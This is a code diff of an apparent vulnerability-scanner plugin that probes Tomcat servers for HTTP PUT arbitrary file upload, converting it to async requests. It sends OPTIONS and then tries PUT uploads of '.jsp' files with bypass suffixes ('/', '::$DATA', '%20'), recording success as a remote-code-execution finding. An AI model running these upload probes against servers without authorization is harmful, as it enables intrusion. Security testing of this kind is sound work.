@@ -3,7 +3,8 @@
 # @author: 'orleven'
 
 import time
-from script import Script, SERVICE_PORT_MAP
+from lib.utils.connect import ClientSession
+from script import Script, SERVICE_PORT_MAP, VUL_TYPE, VUL_LEVEL
 
 class POC(Script):
     def __init__(self, target=None):
@@ -11,29 +12,29 @@ class POC(Script):
         self.name = 'http put'
         self.keyword = ['web', 'tomcat']
         self.info = 'http put'
-        self.type = 'rce'
-        self.level = 'high'
+        self.type = VUL_TYPE.RCE
+        self.level = VUL_LEVEL.HIGH
+        self.repair = ''
+        self.refer = ''
         Script.__init__(self, target=target, service_type=self.service_type)
 
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url != None:
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
                 self.url_normpath(self.url, './'),
             ]))
-            for path in path_list:
-                try:
-                    res = self.curl('options',path+"/testbyme")
-                    allow = res.headers['Allow']
-                    if 'PUT' in allow:
-                        for _url in [str(int(time.time())) + '.jsp/',str(int(time.time())) + '.jsp::$DATA',str(int(time.time())) + '.jsp%20']:
-                            url =  path + _url
-                            res = self.curl('put', url)
-                            if res.status == 201 or res.status == 204:
-                                self.flag = 1
-                                self.req.append({"method": "put"})
-                                self.res.append({"info": url,"key":"PUT"})
-                except:
-                    pass
+            async with ClientSession() as session:
+                for path in path_list:
+                    async with session.options(url=path+"testbyme") as response:
+                        if response!=None and 'Allow' in response.headers and 'PUT' in response.headers['Allow']:
+                            for _url in [str(int(time.time())) + '.jsp/',str(int(time.time())) + '.jsp::$DATA',str(int(time.time())) + '.jsp%20']:
+                                url =  path + _url
+                                async with session.put(url=url, data='test') as response:
+                                    if response != None:
+                                        if response.status == 201 or response.status == 204:
+                                            self.flag = 1
+                                            self.req.append({"method": "put"})
+                                            self.res.append({"info": url,"key":"PUT"})
